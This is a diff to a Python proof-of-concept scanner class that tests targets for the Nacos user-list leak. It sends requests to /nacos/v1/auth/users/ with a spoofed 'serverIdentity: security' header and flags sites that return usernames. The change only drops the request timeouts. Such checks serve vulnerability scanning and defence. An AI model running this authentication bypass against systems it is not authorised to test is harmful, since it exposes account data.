@@ -41,7 +41,7 @@ class poc:
         url = "{}://{}/nacos/v1/auth/users/?pageNo=1&pageSize=9".format(scheme, netloc)
         self.headers["serverIdentity"] = "security"
         try:
-            result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
             if result.status_code == 200 and "\"username\":\"" in result.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在敏感信息泄露漏洞\033[0m
@@ -52,7 +52,7 @@ class poc:
                 return True
             elif result.status_code == 500 and "Parameter conditions" in result.text:
                 url = "{}://{}/nacos/v1/auth/users/?pageNo=1&pageSize=9&search=accurate".format(scheme, netloc)
-                result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+                result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
                 if result.status_code == 200 and "\"username\":\"" in result.text:
                     target = urlparse(url)
                     self.result_text += """\n        [+]    \033[32m检测到目标站点存在敏感信息泄露漏洞\033[0m
@@ -65,7 +65,7 @@ class poc:
                     return False
             elif result.status_code == 404:
                 url1 = "{}://{}/v1/auth/users/?pageNo=1&pageSize=9".format(scheme, netloc)
-                result = requests.get(url=url1, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+                result = requests.get(url=url1, headers=self.headers, verify=False, proxies=self.proxies)
                 if result.status_code == 200 and "\"username\":\"" in result.text:
                     target = urlparse(url)
                     self.result_text += """\n        [+]    \033[32m检测到目标站点存在敏感信息泄露漏洞\033[0m
@@ -76,7 +76,7 @@ class poc:
                     return True
                 elif result.status_code == 500 and "Parameter conditions" in result.text:
                     url = "{}://{}/v1/auth/users/?pageNo=1&pageSize=9&search=accurate".format(scheme, netloc)
-                    result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+                    result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
                     if result.status_code == 200 and "\"username\":\"" in result.text:
                         target = urlparse(url)
                         self.result_text += """\n        [+]    \033[32m检测到目标站点存在敏感信息泄露漏洞\033[0m
